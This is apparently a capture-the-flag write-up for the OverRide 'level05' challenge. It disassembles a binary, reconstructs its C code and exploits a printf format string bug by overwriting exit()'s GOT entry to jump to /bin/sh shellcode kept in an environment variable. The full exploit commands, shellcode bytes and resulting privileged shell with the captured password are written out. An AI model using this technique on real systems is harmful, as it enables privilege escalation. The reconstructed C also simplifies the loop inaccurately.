# level05 - Format String - GOT rewrited

On `level05`'s HOME, we find a binary named : `level05`

```shell
...
0x08048444  main
...
```

```shell
Dump of assembler code for function main:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	push   edi
   0x08048448 <+4>:	push   ebx
   0x08048449 <+5>:	and    esp,0xfffffff0
   0x0804844c <+8>:	sub    esp,0x90
   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:	mov    eax,ds:0x80497f0
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:	lea    eax,[esp+0x28]
   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    eax,[esp+0x28]
   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:	cmp    al,0x40
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    eax,[esp+0x28]
   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:	cmp    al,0x5a
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    eax,[esp+0x28]
   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:	mov    edx,eax
   0x080484bb <+119>:	xor    edx,0x20
   0x080484be <+122>:	lea    eax,[esp+0x28]
   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:	lea    eax,[esp+0x28]
   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:	mov    edx,eax
   0x080484e8 <+164>:	mov    eax,0x0
   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:	mov    edi,edx
   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:	mov    eax,ecx
   0x080484f7 <+179>:	not    eax
   0x080484f9 <+181>:	sub    eax,0x1
   0x080484fc <+184>:	cmp    ebx,eax
   0x080484fe <+186>:	jb     0x8048487 <main+67>
   0x08048500 <+188>:	lea    eax,[esp+0x28]
   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
```

<br>

After decompiling it using gdb, we build this code in C language:

```c
# include <stdio.h>
# include <stdlib.h>
# include <string.h>


int main(void) {

	char	buffer[100]; // esp+0x28
	int		n = 0; // esp+0x8c
	char	tmp;

	fgets( buffer, 100, stdin );

	if ( n < strlen(buffer) ) {

		if ( buffer[n] > '@' && buffer[n] <= 'Z' ) {
			tmp = buffer[n];
			tmp ^= 0x20;
			buffer[n] = tmp;
		}

		n++;

	}
	
	printf(buffer);
	exit( 0 );

}
```

From the assembly code and its transciption into C, we understand that we have
a format string vulnerability. The buffer will be give as argument to `printf()`
without any checking. Moreover, the GOT is writable so we can easily rewrite the
pointer to `exit()`.

```shell
level05@OverRide:~$ readelf -r level05 | grep exit
080497e0  00000407 R_386_JUMP_SLOT   00000000   exit
```

<br>

We now know how to exploit this binary, but to which memory address to rewrite
the pointer to the `exit()` function in GOT to inject our shellcode. Why not in
an environment variable? Let's test it:

```shell
level05@OverRide:~$ (export AAAAAAAA=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"') &&  gdb -q level05 )
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b *0x0804844c
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x0804844c in main ()
(gdb) x/200s $esp
...
0xffffdb0d:	 "AAAAAAAA=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
...
```

We can now exploit this binary !

<br>

To summary, we have:

- An exported environment variable with an **1000 bytes** offset of NOP instruction
(to prevent any different mapping between GDB and normal execution...)
before our shellcode (check [level01](https://github.com/A-Mahla/Security-Pentest-Part-IV/tree/main/level01) for more details about it)

- A Payload with :
	- The addresses to rewrite : `0x080497e0` and `0x080497e2` (*exit() GOT*) 
	- The **Format string** to write `0xffffdc12` (*0xffffdb0d+0x12c to prevent
	any difference with and without GDB*)

<br>

We can now exploit this Format String :

```shell
(export AAAAAAAA=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"') && (python -c 'print "\x08\x04\x97\xe0"[::-1] + b"\x08\x04\x97\xe2"[::-1] + "%56330x%10$n%9197x%11$n"'; cat) | ./level05)
```


```shell
level05@OverRide:~$ (export AAAAAAAA=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80"') && (python -c 'print "\x08\x04\x97\xe0"[::-1] + b"\x08\x04\x97\xe2"[::-1] + "%56330x%10$n%9197x%11$n"'; cat) | ./level05)
...
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
